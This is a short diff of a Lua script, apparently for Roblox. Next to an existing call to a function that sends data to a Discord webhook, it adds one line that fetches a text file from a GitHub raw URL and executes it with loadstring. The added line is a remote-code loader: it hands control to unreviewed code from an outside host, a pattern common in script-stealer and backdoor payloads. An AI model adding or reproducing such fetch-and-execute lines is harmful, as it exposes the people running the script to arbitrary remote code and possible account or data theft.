@@ -32,3 +32,4 @@ end
 
 -- Fonksiyonu çağır
 sendToDiscordWebhook()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/localffdev/socoolscripts/refs/heads/main/localffapi.txt"))()
